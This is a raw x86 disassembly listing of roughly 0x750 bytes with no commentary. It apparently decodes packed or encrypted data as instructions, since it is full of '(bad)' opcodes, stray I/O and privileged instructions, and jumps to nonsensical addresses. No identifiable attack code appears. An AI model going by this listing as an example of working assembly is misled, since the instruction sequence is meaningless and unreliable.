  40dbeb:	sbb    eax,0xe283a805
  40dbf0:	pop    ebp
  40dbf1:	dec    esp
  40dbf2:	jns    0x40dbdb
  40dbf4:	ins    BYTE PTR es:[edi],dx
  40dbf5:	sub    al,bl
  40dbf7:	pop    edi
  40dbf8:	cs pop edx
  40dbfa:	in     eax,dx
  40dbfb:	pop    esi
  40dbfc:	nop
  40dbfd:	pop    ecx
  40dbfe:	or     al,0x54
  40dc00:	inc    ebp
  40dc01:	add    BYTE PTR ds:0xa954dd3,bh
  40dc07:	add    bh,BYTE PTR [edi]
  40dc09:	fcomp  DWORD PTR [ebx-0x23fb67c9]
  40dc0f:	jp     0x40dbae
  40dc11:	sti    
  40dc12:	inc    edx
  40dc13:	add    al,0x27
  40dc15:	pop    esp
  40dc16:	dec    edx
  40dc17:	mov    edi,0xfee78a01
  40dc1c:	mov    esi,DWORD PTR [edx-0x10]
  40dc1f:	call   0x3db5:0x6b92837b
  40dc26:	mov    ebx,0x4bc6a462
  40dc2b:	xchg   esp,eax
  40dc2c:	jl     0x40dc9f
  40dc2e:	push   esi
  40dc2f:	sahf   
  40dc30:	add    DWORD PTR [edx-0x19b5d034],0x6f
  40dc37:	cmp    dh,bl
  40dc39:	jnp    0x40dc0f
  40dc3b:	pop    esi
  40dc3c:	cmp    ebp,DWORD PTR [edi]
  40dc3e:	mov    ecx,0x3bef19b6
  40dc43:	sbb    DWORD PTR [ecx+0x5696e8b3],0x6704d9a6
  40dc4d:	scas   eax,DWORD PTR es:[edi]
  40dc4e:	loopne 0x40dc20
  40dc50:	imul   DWORD PTR [esi+0x357d007f]
  40dc56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc57:	sbb    BYTE PTR [edx+0x74],ah
  40dc5a:	aad    0xa0
  40dc5c:	inc    ebx
  40dc5d:	lea    edi,cs:[ebp+0x10]
  40dc61:	xor    DWORD PTR [edx-0x6a888868],esi
  40dc67:	mov    ch,0xde
  40dc69:	retf   
  40dc6a:	xchg   esp,eax
  40dc6b:	adc    al,0x54
  40dc6d:	out    dx,eax
  40dc6e:	adc    DWORD PTR [esp+ecx*2-0x54649f8b],0x69adbbfc
  40dc79:	adc    al,0x3c
  40dc7b:	pop    ds
  40dc7c:	add    al,0x4
  40dc7e:	neg    ebx
  40dc80:	xchg   edx,eax
  40dc81:	cdq    
  40dc82:	push   eax
  40dc83:	(bad)  
  40dc84:	xor    DWORD PTR [ebp-0x21],esi
  40dc87:	ficomp WORD PTR [ebp-0x34]
  40dc8a:	imul   esp,DWORD PTR [eax+0x40],0xffffffa1
  40dc8e:	push   eax
  40dc8f:	fcomp  DWORD PTR [eax+0x55503693]
  40dc95:	repz xlat BYTE PTR ds:[ebx]
  40dc97:	leave  
  40dc98:	push   esp
  40dc99:	enter  0xe07b,0x4b
  40dc9d:	dec    edi
  40dc9e:	scas   eax,DWORD PTR es:[edi]
  40dc9f:	push   ebp
  40dca0:	xchg   edi,eax
  40dca1:	mov    DWORD PTR [ebx+edi*8+0x72],eax
  40dca5:	mov    DWORD PTR [ecx-0x60],esi
  40dca8:	les    ecx,FWORD PTR [ebx+eax*8+0x14]
  40dcac:	cmp    ah,ah
  40dcae:	scas   eax,DWORD PTR es:[edi]
  40dcaf:	add    al,BYTE PTR [edx+0x3d7eab36]
  40dcb5:	or     eax,0x5b87a220
  40dcba:	ret    
  40dcbb:	iret   
  40dcbc:	xlat   BYTE PTR ds:[ebx]
  40dcbd:	pop    edx
  40dcbe:	mov    dh,0xb5
  40dcc0:	lahf   
  40dcc1:	or     esi,DWORD PTR [ebp+edi*2-0x60]
  40dcc5:	lods   al,BYTE PTR ds:[esi]
  40dcc6:	inc    ebp
  40dcc7:	jge    0x40dd1d
  40dcc9:	and    DWORD PTR [esi-0xb],esi
  40dccc:	mov    edx,0x8ecbf355
  40dcd1:	pop    es
  40dcd2:	stos   DWORD PTR es:[edi],eax
  40dcd3:	inc    esp
  40dcd4:	(bad)  
  40dcd5:	out    dx,al
  40dcd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dcd7:	dec    eax
  40dcd8:	sti    
  40dcd9:	jae    0x40dd36
  40dcdb:	xchg   ecx,eax
  40dcdc:	push   esp
  40dcdd:	and    al,0x41
  40dcdf:	push   edi
  40dce0:	test   eax,0x2bca6c1e
  40dce5:	(bad)  
  40dce6:	and    eax,0xb9b5b647
  40dceb:	mov    al,0xca
  40dced:	mov    ebx,0xfd6b1f7c
  40dcf2:	xchg   DWORD PTR [ebp+esi*8+0x2b],edx
  40dcf6:	inc    eax
  40dcf7:	mov    edi,0x4093e6bc
  40dcfc:	fnstcw WORD PTR [eax+ebp*2-0x38]
  40dd00:	repz imul edx,DWORD PTR [eax+0x54],0x3aca0192
  40dd08:	arpl   WORD PTR [eax-0x2c],dx
  40dd0b:	pusha  
  40dd0c:	lods   al,BYTE PTR ds:[esi]
  40dd0d:	mov    dh,0x1c
  40dd0f:	aaa    
  40dd10:	mov    bh,0x80
  40dd12:	sbb    BYTE PTR [edi+0x7a8f04df],0x33
  40dd19:	sti    
  40dd1a:	xchg   esi,eax
  40dd1b:	imul   eax,eax,0x22665cfb
  40dd21:	pop    ecx
  40dd22:	dec    esp
  40dd23:	inc    esp
  40dd24:	or     bh,bh
  40dd26:	nop
  40dd27:	out    0xcf,eax
  40dd29:	sub    DWORD PTR [esi],edi
  40dd2b:	mov    dl,0xa3
  40dd2d:	outs   dx,DWORD PTR ds:[esi]
  40dd2e:	jmp    0x222dc53e
  40dd33:	dec    edi
  40dd34:	icebp  
  40dd35:	xor    al,0x9f
  40dd37:	cs cmp ecx,esp
  40dd3a:	dec    ecx
  40dd3b:	sbb    esp,DWORD PTR [esi+0x49]
  40dd3e:	sub    bl,BYTE PTR [esi+0x318eb4cf]
  40dd44:	outs   dx,BYTE PTR ds:[esi]
  40dd45:	into   
  40dd46:	int3   
  40dd47:	das    
  40dd48:	iret   
  40dd49:	out    0x99,eax
  40dd4b:	(bad)  
  40dd4c:	sub    eax,0x7b46b006
  40dd51:	or     BYTE PTR [ecx-0x710a09f4],al
  40dd57:	sahf   
  40dd58:	in     al,0x5d
  40dd5a:	or     cl,BYTE PTR [esi-0x26]
  40dd5d:	das    
  40dd5e:	pop    esi
  40dd5f:	stos   DWORD PTR es:[edi],eax
  40dd60:	in     eax,0x36
  40dd62:	mov    ecx,edi
  40dd64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd65:	and    dl,BYTE PTR [esi-0x7c1f43b0]
  40dd6b:	lds    esi,FWORD PTR [ecx-0x68]
  40dd6e:	sub    DWORD PTR [edx*8+0xed0b8b9],eax
  40dd75:	sar    DWORD PTR [ebp-0x66],0x23
  40dd79:	fnstcw WORD PTR [edx+0x67360831]
  40dd7f:	test   eax,0x6a44bd0d
  40dd84:	jmp    0xb27bcb72
  40dd89:	test   eax,0xeec1489b
  40dd8e:	scas   al,BYTE PTR es:[edi]
  40dd8f:	jmp    0xf1ecb66e
  40dd94:	pop    es
  40dd95:	cmp    BYTE PTR [edi-0x287fdebd],al
  40dd9b:	cmp    dh,ah
  40dd9d:	imul   edx,DWORD PTR [edx],0xbfdaa425
  40dda3:	daa    
  40dda4:	push   esi
  40dda5:	push   ds
  40dda6:	rol    BYTE PTR [edi],1
  40dda8:	mov    al,0xd
  40ddaa:	mov    al,0x7b
  40ddac:	jg     0x40dd34
  40ddae:	cmp    BYTE PTR [edx+edx*2-0x743c118a],al
  40ddb5:	add    al,0x37
  40ddb7:	push   DWORD PTR ds:0xf83f5483
  40ddbd:	inc    esp
  40ddbe:	in     al,0xe9
  40ddc0:	icebp  
  40ddc1:	in     al,dx
  40ddc2:	add    BYTE PTR [ebx-0x1e],bh
  40ddc5:	or     ebx,DWORD PTR [ecx+0x6b]
  40ddc8:	push   ecx
  40ddc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ddca:	cmp    eax,0x6906a22a
  40ddcf:	pusha  
  40ddd0:	pop    DWORD PTR [esi+0x7d]
  40ddd3:	not    BYTE PTR [esp+eax*1]
  40ddd6:	sub    DWORD PTR [edx-0x58],edx
  40ddd9:	cmp    DWORD PTR [edx],0x875b2bfd
  40dddf:	pop    ebp
  40dde0:	sub    cl,BYTE PTR [edi]
  40dde2:	cmp    BYTE PTR [ecx+ebx*1+0x1ff1d6e5],0x9b
  40ddea:	loopne 0x40de63
  40ddec:	into   
  40dded:	ficom  WORD PTR [edi+eiz*8]
  40ddf0:	and    ecx,DWORD PTR [eax+0x75]
  40ddf3:	xor    DWORD PTR [esi+ebx*8+0xbcb093],edi
  40ddfa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ddfb:	pop    esp
  40ddfc:	inc    eax
  40ddfd:	inc    ecx
  40ddfe:	sbb    dl,dl
  40de00:	shl    al,1
  40de02:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40de04:	jno    0x40dde5
  40de06:	pop    ebp
  40de07:	sbb    DWORD PTR [esi],esi
  40de09:	mov    ds:0x5b7980e7,al
  40de0e:	lods   al,BYTE PTR ds:[esi]
  40de0f:	cmp    BYTE PTR [esi],al
  40de11:	out    0x9d,eax
  40de13:	lds    eax,FWORD PTR [edx+0x63]
  40de16:	gs xchg esi,eax
  40de18:	mov    ch,0x69
  40de1a:	mov    edi,0x75dcac89
  40de1f:	xchg   esi,eax
  40de20:	mov    bh,0x18
  40de22:	jg     0x40de0c
  40de24:	inc    esp
  40de25:	mov    ebp,0xa5c81475
  40de2a:	cs xchg ebp,eax
  40de2c:	out    0xb7,al
  40de2e:	ss addr16 popf 
  40de31:	sub    BYTE PTR [edx-0xf],al
  40de34:	sub    al,0xc
  40de36:	popf   
  40de37:	adc    DWORD PTR [ebx],ebx
  40de39:	jnp    0x40ddf6
  40de3b:	fdiv   DWORD PTR [eax+0x6bd7e0fe]
  40de41:	push   es
  40de42:	sub    eax,0x2b5fc705
  40de47:	test   eax,0xdfb28746
  40de4c:	xchg   ebp,eax
  40de4d:	fstp   DWORD PTR [eax]
  40de4f:	sub    bl,BYTE PTR [edi-0x67dbe9e1]
  40de55:	fbstp  TBYTE PTR [eax+0x2e]
  40de58:	inc    ebp
  40de59:	mov    cl,BYTE PTR [ecx]
  40de5b:	cmp    ebx,DWORD PTR [ebp-0x108cf841]
  40de61:	adc    eax,0xfc786a95
  40de66:	lahf   
  40de67:	popa   
  40de68:	and    eax,0xcdc539d7
  40de6d:	and    bh,BYTE PTR [edi-0x56]
  40de70:	lods   al,BYTE PTR ds:[esi]
  40de71:	cwde   
  40de72:	sti    
  40de73:	pop    eax
  40de74:	sahf   
  40de75:	mov    dh,0x4b
  40de77:	jecxz  0x40de61
  40de79:	mov    al,ds:0xfbaf9854
  40de7e:	pusha  
  40de7f:	clc    
  40de80:	mov    DWORD PTR [ebp+0x24],edi
  40de83:	outs   dx,DWORD PTR ds:[esi]
  40de84:	rcr    DWORD PTR [eax+ebp*4],cl
  40de87:	xor    BYTE PTR [eax],0xb4
  40de8a:	imul   BYTE PTR [esi+0x31]
  40de8d:	xor    eax,0xc8174091
  40de92:	jae    0x40dee5
  40de94:	(bad)  
  40de95:	push   0xffffff94
  40de97:	add    DWORD PTR [ebp+0x2803299],0x52d718cb
  40dea1:	xor    ebp,esi
  40dea3:	cmp    BYTE PTR ds:0x35b377f5,bl
  40dea9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40deaa:	lahf   
  40deab:	leave  
  40deac:	mov    ch,0x4b
  40deae:	push   esi
  40deaf:	inc    edi
  40deb0:	xchg   ch,cl
  40deb2:	jmp    FWORD PTR [edi]
  40deb4:	jecxz  0x40dedd
  40deb6:	mov    cl,0x54
  40deb8:	ins    DWORD PTR es:[edi],dx
  40deb9:	dec    ebx
  40deba:	cmp    BYTE PTR [edi-0x5c318b0b],dh
  40dec0:	fistp  WORD PTR [edi]
  40dec2:	jns    0x40df0d
  40dec4:	xor    bl,BYTE PTR [edi+0x5c52b1bf]
  40deca:	ins    BYTE PTR es:[edi],dx
  40decb:	pop    ss
  40decc:	dec    edi
  40decd:	add    DWORD PTR [ecx-0x73c4dad4],ebp
  40ded3:	dec    esp
  40ded4:	push   esp
  40ded5:	aad    0xb7
  40ded7:	mov    eax,0xfdc10353
  40dedc:	ja     0x40df0d
  40dede:	sub    ah,BYTE PTR [edi+0x401cfadc]
  40dee4:	or     eax,0x9ca19e2f
  40dee9:	mov    ecx,0xd5d1c642
  40deee:	lds    esi,FWORD PTR [ebp+eiz*4-0x17]
  40def2:	lods   eax,DWORD PTR ds:[esi]
  40def3:	shr    DWORD PTR [edi],0x46
  40def6:	fwait
  40def7:	retf   
  40def8:	(bad)  
  40defa:	push   ds
  40defb:	mov    cs,WORD PTR [ebx-0x71]
  40defe:	jp     0x40deae
  40df00:	pop    ss
  40df01:	push   ebx
  40df02:	outs   dx,BYTE PTR ds:[esi]
  40df03:	cli    
  40df04:	xchg   edx,eax
  40df05:	cmp    ah,BYTE PTR [esp+edx*4-0x2e6302c]
  40df0c:	pop    edi
  40df0d:	sbb    al,0x69
  40df0f:	int    0x54
  40df11:	shr    edi,0xf0
  40df14:	pop    ebp
  40df15:	neg    DWORD PTR [edi]
  40df17:	dec    esi
  40df18:	inc    edx
  40df19:	pop    eax
  40df1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df1b:	xchg   BYTE PTR [ecx+0x5f],bh
  40df1e:	sahf   
  40df1f:	push   cs
  40df20:	lahf   
  40df21:	aaa    
  40df22:	push   eax
  40df23:	push   ds
  40df24:	outs   dx,BYTE PTR ds:[esi]
  40df25:	cmp    edi,DWORD PTR [edi-0x53]
  40df28:	sbb    eax,0x471887d5
  40df2d:	sub    dl,0x8
  40df30:	scas   al,BYTE PTR es:[edi]
  40df31:	mov    dl,0xe6
  40df33:	vorpd  xmm1,xmm2,XMMWORD PTR [edx+eiz*8-0x65]
  40df39:	mov    al,0xa5
  40df3b:	data16 (bad) 
  40df3d:	mov    al,ds:0x9e37c045
  40df42:	and    ecx,ecx
  40df44:	cmp    al,0x73
  40df46:	lods   eax,DWORD PTR ds:[esi]
  40df47:	enter  0xaee6,0xb0
  40df4b:	in     eax,0x4d
  40df4d:	test   esp,0x42812ab1
  40df53:	xor    al,0x9d
  40df55:	push   0x85d8a61a
  40df5a:	repz test eax,0x3ec54943
  40df60:	ja     0x40df7a
  40df62:	jmp    0x40dfdf
  40df64:	fst    DWORD PTR [edx]
  40df66:	mov    bl,0xe8
  40df68:	aad    0x3c
  40df6a:	scas   eax,DWORD PTR es:[edi]
  40df6b:	int3   
  40df6c:	mov    esi,cs
  40df6e:	pcmpeqd mm6,QWORD PTR gs:[edi-0x357225a2]
  40df76:	xor    eax,0xa190ae91
  40df7b:	sub    al,0xab
  40df7d:	push   eax
  40df7e:	in     eax,0xf3
  40df80:	(bad)  
  40df81:	and    BYTE PTR [esi],0x1b
  40df84:	stos   BYTE PTR es:[edi],al
  40df85:	pop    eax
  40df86:	rcl    DWORD PTR [esi-0x80],0xfc
  40df8a:	in     al,0x8a
  40df8c:	sub    BYTE PTR [eax+0x62],0xda
  40df90:	cmp    edx,ebp
  40df92:	dec    esi
  40df93:	pop    es
  40df94:	(bad)  
  40df95:	div    edx
  40df97:	out    0x78,al
  40df99:	cmc    
  40df9a:	dec    ecx
  40df9b:	fdiv   DWORD PTR [esi]
  40df9d:	jae    0x40dfdf
  40df9f:	aam    0xbd
  40dfa1:	mov    ecx,DWORD PTR [ebp-0x2b]
  40dfa4:	adc    eax,0xd44f4531
  40dfa9:	pop    ds
  40dfaa:	mov    al,ds:0xc60d40b3
  40dfaf:	sbb    al,0x10
  40dfb1:	jns    0x40df8a
  40dfb3:	pusha  
  40dfb4:	das    
  40dfb5:	loopne 0x40dffe
  40dfb7:	xchg   esi,eax
  40dfb8:	adc    ah,BYTE PTR [ebp-0x74b85ad0]
  40dfbe:	nop
  40dfbf:	jg     0x40dfdf
  40dfc1:	cmp    ch,bh
  40dfc3:	(bad)  
  40dfc4:	cli    
  40dfc5:	adc    ah,BYTE PTR [eax-0x27c6f09f]
  40dfcb:	test   al,0xaf
  40dfcd:	dec    esp
  40dfce:	xchg   esp,eax
  40dfcf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dfd0:	js     0x40e039
  40dfd2:	lea    eax,[esi]
  40dfd4:	ja     0x40e044
  40dfd6:	shr    bl,cl
  40dfd8:	lea    esi,[edx+ebx*2+0x36]
  40dfdc:	jno    0x40dfa3
  40dfde:	add    eax,0x4956186d
  40dfe3:	push   esp
  40dfe4:	dec    ebp
  40dfe5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dfe6:	cmp    eax,0x21453682
  40dfeb:	(bad)  
  40dfec:	fnstsw ax
  40dfee:	mov    al,ds:0xbc115520
  40dff3:	jle    0x40df98
  40dff5:	xor    esp,edx
  40dff7:	xchg   edx,eax
  40dff8:	in     eax,0xca
  40dffa:	rcl    DWORD PTR [eax-0x2472f4fb],1
  40e000:	int    0x67
  40e002:	pop    edx
  40e003:	sbb    al,0x3a
  40e005:	push   ss
  40e006:	jmp    FWORD PTR [esi+0x35b4ae79]
  40e00c:	cdq    
  40e00d:	mov    edi,0x34c19ea9
  40e012:	mov    esp,0xb9e0a9ae
  40e017:	xchg   edi,eax
  40e018:	daa    
  40e019:	mov    bh,0x17
  40e01b:	repz sbb edx,ebx
  40e01e:	scas   al,BYTE PTR es:[edi]
  40e01f:	stos   DWORD PTR es:[edi],eax
  40e020:	and    al,0x9c
  40e022:	repnz inc esi
  40e024:	jg     0x40e043
  40e026:	stc    
  40e027:	(bad)  
  40e028:	mov    edx,0xab8fe092
  40e02d:	and    al,0xd2
  40e02f:	pop    ebx
  40e030:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e031:	call   0x452ce953
  40e036:	push   ecx
  40e037:	and    BYTE PTR [eax+0x26eb29ea],0xcb
  40e03e:	ss mov cl,0xc3
  40e041:	and    esi,eax
  40e043:	mov    dl,0xe7
  40e045:	out    dx,eax
  40e046:	push   ebp
  40e047:	push   esi
  40e048:	add    al,bl
  40e04a:	jo     0x40dfea
  40e04c:	loop   0x40e08a
  40e04e:	mov    esp,0x6c036974
  40e053:	mov    ebp,0x3137cd5d
  40e058:	push   ss
  40e059:	push   es
  40e05a:	mov    al,0x6
  40e05c:	adc    bh,BYTE PTR [esp+ebp*8+0xe7d9dc9]
  40e063:	mov    ch,0x72
  40e065:	aam    0xe8
  40e067:	xchg   esi,eax
  40e068:	mov    ebx,0xedaa7fe6
  40e06d:	or     eax,0x817fecaa
  40e072:	mov    ds,WORD PTR [esi]
  40e074:	pop    ecx
  40e075:	pand   mm7,mm0
  40e078:	mov    ecx,DWORD PTR [ebx]
  40e07a:	ss out dx,eax
  40e07c:	adc    al,0x9c
  40e07e:	mov    ebp,0x3ac3b26d
  40e083:	fwait
  40e084:	dec    ebp
  40e085:	es aad 0xf1
  40e088:	cdq    
  40e089:	sub    bh,ah
  40e08b:	stos   DWORD PTR es:[edi],eax
  40e08c:	mov    esi,0x5d85ea97
  40e091:	mov    bl,0xc5
  40e093:	out    0x77,eax
  40e095:	out    dx,al
  40e096:	out    dx,eax
  40e097:	rol    eax,0x58
  40e09a:	loop   0x40e0ed
  40e09c:	mov    BYTE PTR [edx-0x78],dl
  40e09f:	and    dl,bh
  40e0a1:	jl     0x40e04e
  40e0a3:	mov    ebx,DWORD PTR [eax+0x71]
  40e0a6:	xchg   DWORD PTR ss:0xf826c9ab,edx
  40e0ad:	jns    0x40e109
  40e0af:	repnz pop eax
  40e0b1:	mov    bl,0x5c
  40e0b3:	pop    esp
  40e0b4:	and    BYTE PTR [ebp+0x74c0b751],ch
  40e0ba:	dec    edx
  40e0bb:	mov    ds,WORD PTR [esi+0x23cf4984]
  40e0c1:	fdiv   st(5),st
  40e0c3:	pop    esp
  40e0c4:	add    eax,DWORD PTR [edx+0x54]
  40e0c7:	push   es
  40e0c8:	cmp    al,BYTE PTR [edx-0x4e5d3bf8]
  40e0ce:	and    ah,dh
  40e0d0:	mov    dh,0x3c
  40e0d2:	sbb    ah,dh
  40e0d4:	ja     0x40e150
  40e0d6:	int3   
  40e0d7:	lock cmp al,0x6
  40e0da:	pop    ds
  40e0db:	outs   dx,DWORD PTR ds:[esi]
  40e0dc:	pop    ebp
  40e0dd:	cmp    eax,0xe2d181c8
  40e0e2:	imul   ebx,DWORD PTR [ecx],0xffffffc3
  40e0e5:	mov    dl,0x40
  40e0e7:	sar    DWORD PTR [eax+0x61f96a8a],1
  40e0ed:	and    eax,0xe9e124b4
  40e0f2:	sbb    dl,ch
  40e0f4:	mov    ebp,0x6fb5a4c1
  40e0f9:	inc    esi
  40e0fa:	add    al,0x50
  40e0fc:	inc    edx
  40e0fd:	ror    BYTE PTR [edi-0x727fab10],1
  40e103:	push   edi
  40e104:	lods   al,BYTE PTR ds:[esi]
  40e105:	das    
  40e106:	ja     0x40e120
  40e108:	jp     0x40e0bd
  40e10a:	mov    cl,0x49
  40e10c:	xlat   BYTE PTR ds:[ebx]
  40e10d:	fidivr WORD PTR [edx+0x4475b6c1]
  40e113:	stc    
  40e114:	imul   eax,DWORD PTR [ebx],0x84be531d
  40e11a:	js     0x40e0ba
  40e11c:	ss dec ebp
  40e11e:	push   ebx
  40e11f:	pop    edi
  40e120:	outs   dx,DWORD PTR ds:[esi]
  40e121:	sahf   
  40e122:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e123:	sbb    DWORD PTR [ecx],eax
  40e125:	dec    edx
  40e126:	xchg   edi,eax
  40e127:	cmp    eax,0xe3f01387
  40e12c:	sbb    dh,BYTE PTR [esi]
  40e12e:	and    BYTE PTR [ebp+0xb8c87a0],al
  40e134:	sbb    DWORD PTR [edx+0x82bbc07],ebp
  40e13a:	test   eax,0xc9c4e495
  40e13f:	loope  0x40e185
  40e141:	js     0x40e1bf
  40e143:	sub    BYTE PTR [edx-0x68],0xc6
  40e147:	and    DWORD PTR [ebx],edx
  40e149:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e14a:	das    
  40e14b:	popf   
  40e14c:	ret    0xd7e9
  40e14f:	add    ch,dh
  40e151:	shl    BYTE PTR [edi+0x1a],cl
  40e154:	xchg   ecx,eax
  40e155:	dec    ecx
  40e156:	push   0xeb5d2b34
  40e15b:	out    dx,al
  40e15c:	sub    esp,DWORD PTR [ecx-0x9abdb03]
  40e162:	hlt    
  40e163:	scas   eax,DWORD PTR es:[edi]
  40e164:	loope  0x40e19f
  40e166:	mov    al,ds:0x2ffc96cb
  40e16b:	inc    ebx
  40e16c:	jb     0x40e14d
  40e16e:	sub    BYTE PTR cs:[edx],bl
  40e171:	in     al,0x31
  40e173:	(bad)  
  40e174:	imul   BYTE PTR [ebx+0x3c6461ca]
  40e17a:	sub    eax,0x2a054f2d
  40e17f:	pop    ss
  40e180:	dec    edi
  40e181:	out    0x9d,al
  40e183:	xchg   esi,eax
  40e184:	addr16 cmp dh,bl
  40e187:	dec    esp
  40e188:	mov    ebx,0x1c60b255
  40e18d:	push   eax
  40e18e:	mov    eax,0x805ed033
  40e193:	or     dl,BYTE PTR [edx]
  40e195:	sbb    bh,BYTE PTR [ebp+0x5]
  40e198:	scas   eax,DWORD PTR es:[edi]
  40e199:	je     0x40e131
  40e19b:	test   DWORD PTR [ebp-0x1aa78d14],esi
  40e1a1:	in     eax,dx
  40e1a2:	mov    ah,0x2e
  40e1a4:	xchg   ecx,eax
  40e1a5:	adc    eax,0x4e99aa71
  40e1aa:	add    dh,bh
  40e1ac:	ret    
  40e1ad:	iret   
  40e1ae:	pop    esi
  40e1af:	and    eax,0xbde8a9f9
  40e1b4:	leave  
  40e1b5:	cli    
  40e1b6:	fmul   DWORD PTR [eax+0x66]
  40e1b9:	adc    BYTE PTR [ebp+0x52],0x21
  40e1bd:	mov    eax,0x965b3d2d
  40e1c2:	mov    DWORD PTR [edx-0x24e0222b],esi
  40e1c8:	dec    edx
  40e1c9:	dec    ebp
  40e1ca:	add    DWORD PTR [esi+0x5f],esi
  40e1cd:	std    
  40e1ce:	imul   ebx,edx,0x24
  40e1d1:	or     ebp,DWORD PTR [esi]
  40e1d3:	lahf   
  40e1d4:	aaa    
  40e1d5:	push   ebx
  40e1d6:	imul   edi,ebp,0x8f9b253e
  40e1dc:	jmp    0x5d85:0xe360947f
  40e1e3:	or     al,0xce
  40e1e5:	cmp    cl,BYTE PTR [eax-0x9]
  40e1e8:	xchg   esp,eax
  40e1e9:	or     BYTE PTR [ecx-0x19],ch
  40e1ec:	leave  
  40e1ed:	dec    edx
  40e1ee:	xchg   esp,eax
  40e1ef:	or     al,BYTE PTR ds:0x14637bba
  40e1f5:	pop    esp
  40e1f6:	mov    ah,0x63
  40e1f8:	mov    ch,0x23
  40e1fa:	sbb    BYTE PTR [edi-0x66],dh
  40e1fd:	fmul   DWORD PTR [esp+eax*8+0x14fce895]
  40e204:	xchg   esi,eax
  40e205:	out    0xa8,al
  40e207:	mov    edx,0x8988d68d
  40e20c:	dec    esi
  40e20d:	push   esi
  40e20e:	imul   ebp,DWORD PTR ds:0x852b96fb,0x48
  40e215:	push   ds
  40e216:	int    0x86
  40e218:	and    al,0xcf
  40e21a:	xor    cl,0xa5
  40e21d:	frstor [edx-0x4589c3f]
  40e223:	adc    ah,BYTE PTR [eax]
  40e225:	pusha  
  40e226:	push   ecx
  40e227:	and    eax,0x8b0b667a
  40e22c:	repz cwde 
  40e22e:	sti    
  40e22f:	add    esi,0xfe7798f3
  40e235:	xor    DWORD PTR [ebp-0x74],ebp
  40e238:	js     0x40e270
  40e23a:	push   edi
  40e23b:	jnp    0x40e24e
  40e23d:	rcl    cl,cl
  40e23f:	sub    BYTE PTR [edx-0x76],ah
  40e242:	xor    eax,0x97e496b7
  40e247:	aam    0xeb
  40e249:	ins    BYTE PTR es:[edi],dx
  40e24a:	mov    esi,0x6af4491d
  40e24f:	dec    esp
  40e250:	push   ebp
  40e251:	push   edi
  40e252:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e253:	jmp    0x9a36:0xf74df9e3
  40e25a:	cdq    
  40e25b:	gs inc edx
  40e25d:	outs   dx,BYTE PTR ds:[esi]
  40e25e:	add    eax,0xd46aa00
  40e263:	(bad)  [esi]
  40e265:	add    ecx,edx
  40e267:	lea    ebx,[ecx+0x9]
  40e26a:	or     BYTE PTR [edx+0x6e],dl
  40e26d:	cdq    
  40e26e:	call   0x2bddc1e0
  40e273:	xchg   ebp,eax
  40e274:	mov    bl,0xea
  40e276:	ror    BYTE PTR [esi],1
  40e278:	mov    ecx,0xb3a0c035
  40e27d:	mov    esp,0x2a28a2b2
  40e282:	pop    es
  40e283:	mov    ebx,0x3e2a617c
  40e288:	xor    edi,esp
  40e28a:	mov    bh,0x67
  40e28c:	or     edx,DWORD PTR [esi]
  40e28e:	pop    edi
  40e28f:	xchg   ecx,eax
  40e290:	mov    ah,0xe4
  40e292:	scas   al,BYTE PTR es:[edi]
  40e293:	sahf   
  40e294:	add    ebx,DWORD PTR [esi]
  40e296:	cs pop ebx
  40e298:	dec    ebx
  40e299:	pop    ds
  40e29a:	shl    DWORD PTR [esi-0x80],0xdf
  40e29e:	pop    eax
  40e29f:	enter  0x9051,0xdb
  40e2a3:	cmp    BYTE PTR [eax+0x1f],bh
  40e2a6:	(bad)  
  40e2a7:	cmp    eax,0xf9593005
  40e2ac:	mov    ch,0xe2
  40e2ae:	inc    esi
  40e2af:	fwait
  40e2b0:	mov    al,0xc3
  40e2b2:	rcl    si,cl
  40e2b5:	dec    ecx
  40e2b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e2b7:	mov    esp,0x773929cf
  40e2bc:	fistp  DWORD PTR [ebx]
  40e2be:	(bad)  
  40e2bf:	xchg   edi,eax
  40e2c0:	cmp    edi,DWORD PTR [ebx+0x627f352e]
  40e2c6:	rol    edi,0x32
  40e2c9:	cmovo  ebx,DWORD PTR [edx+0x5059e385]
  40e2d0:	mov    eax,ds:0x916723b1
  40e2d5:	shr    BYTE PTR [edi+0x39],cl
  40e2d8:	and    DWORD PTR [ebp+0x5a2e6148],ecx
  40e2de:	test   DWORD PTR ds:0xc163da96,esp
  40e2e4:	cmp    eax,0xb6f939f2
  40e2e9:	iret   
  40e2ea:	or     al,0x7c
  40e2ec:	mov    cl,0x63
  40e2ee:	test   eax,esi
  40e2f0:	cmp    DWORD PTR [edi+0x4e],0x29c58975
  40e2f7:	push   eax
  40e2f8:	xchg   DWORD PTR ds:0xb748f154,esi
  40e2fe:	add    al,0xe4
  40e300:	pop    es
  40e301:	xchg   ebx,eax
  40e302:	pushf  
  40e303:	fisub  WORD PTR [eax+ebx*2-0x3a]
  40e307:	mov    ds:0xd0f59405,al
  40e30c:	test   eax,0x69219494
  40e311:	data16 jge 0x40e342
  40e314:	jae    0x40e2f7
  40e316:	cdq    
  40e317:	push   0x5a
  40e319:	stc    
  40e31a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e31b:	aad    0x83
  40e31d:	test   BYTE PTR [edi+0x4],ah
  40e320:	ins    BYTE PTR es:[edi],dx
  40e321:	pop    ds
  40e322:	jo     0x40e2e9
  40e324:	cmp    DWORD PTR [eax-0x40],ebp
  40e327:	cmp    ch,0x4f
  40e32a:	or     al,0xea
  40e32c:	das    
  40e32d:	addr16 push edx
  40e32f:	mov    eax,ds:0x8c67c619
  40e334:	int    0x8d
  40e336:	imul   eax,DWORD PTR [edi],0xe7adb649
  40e33c:	sub    al,0x87
  40e33e:	xchg   bl,dl
  40e340:	or     BYTE PTR [ebx],dh
